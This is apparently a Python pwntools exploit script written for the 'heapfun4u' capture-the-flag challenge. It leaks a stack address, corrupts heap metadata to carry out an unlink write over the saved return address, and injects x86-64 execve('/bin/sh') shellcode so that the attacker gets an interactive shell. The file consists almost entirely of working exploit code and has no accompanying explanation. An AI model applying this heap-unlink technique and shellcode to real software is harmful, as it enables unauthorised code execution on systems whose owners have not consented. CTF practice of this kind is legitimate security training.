from pwn import *

#PRINT=True
PRINT=False
PROMPT='| '

# http://shell-storm.org/shellcode/files/shellcode-603.php
shellcode  = "\x48\x31\xd2"                             # xor    %rdx, %rdx
shellcode += "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68" # mov    $0x68732f6e69622f2f, %rbx
shellcode += "\x48\xc1\xeb\x08"                         # shr    $0x8, %rbx
shellcode += "\x53"                                     # push   %rbx
shellcode += "\x48\x89\xe7"                             # mov    %rsp, %rdi
shellcode += "\x50"                                     # push   %rax
shellcode += "\x57"                                     # push   %rdi
shellcode += "\x48\x89\xe6"                             # mov    %rsp, %rsi
shellcode += "\xb0\x3b"                                 # mov    $0x3b, %al
shellcode += "\x0f\x05";                                # syscall

# socat tcp-l:3957,reuseaddr,fork exec: heapfun4u
r = remote('localhost', 1337)
#r = remote('heapfun4u_873c6d81dd688c9057d5b229cf80579e.quals.shallweplayaga.me', 3957)

def recvuntil(rec='', p=PRINT):
    global r
    data = r.recvuntil(rec)
    if p:
        print(data)
    return data

def sendline(msg='', p=PRINT):
    global r
    r.sendline(msg)

def sr(rec=PROMPT, msg='', p=PRINT):
    data = recvuntil(rec, p)
    sendline(msg, p)
    if p:
        print(msg)
    return data

def allocate(size):
    sr(msg='A')
    sr(': ', size)

def free(num):
    sr(msg='F')
    sr(': ', num)

def write(num, data):
    sr(msg='W')
    leak = sr(': ', num)
    addr = 0
    for line in leak.split('\n'):
        if line[0] == num:
            addr = int(line.split()[1], 16)
    sr(': ', data)
    if addr:
        return addr

def leak():
    sr(msg='N')
    recvuntil(': ')
    addr = recvuntil('\n')
    return int(addr, 16)

def leave():
    sr(msg='E')


stack_ptr = leak()
log.info('leaked stack ptr: {}'.format(hex(stack_ptr)))
saved_rip = stack_ptr + 316
log.info('saved rip at:     {}'.format(hex(saved_rip)))
allocate('16')  # buffer 1
allocate('128') # buffer 2
allocate('16')  # buffer 3
free('2')
free('1')
allocate('128') # buffer 4
fwptr_addr = write('4', 'AAAAAAAA')
log.info('forward ptr addr: {}'.format(hex(fwptr_addr)))
mal_size = saved_rip - fwptr_addr
log.info('its content:      {}'.format(hex(mal_size)))
log.info('sanity check:     {}'.format(hex(fwptr_addr + mal_size)))

unlink_payload  = p64(mal_size)   # fill buffer 1
unlink_payload += p64(0)          # (no bk ptr)
unlink_payload += p64(16 + 1 + 2) # fake buffer size
unlink_payload += 'BBBBBBBB' * 2  # fill fake buffer
unlink_payload += p64(16 + 2)     # fake freed buffer size
unlink_payload += p64(fwptr_addr) # fwd pointer
unlink_payload += p64(0)          # no bk ptr
write('4', unlink_payload)
free('2')

payload  = 'AAAAAAAA' * 2 # fill buffer 1
payload += shellcode

write('4', payload)
leave()

r.interactive()
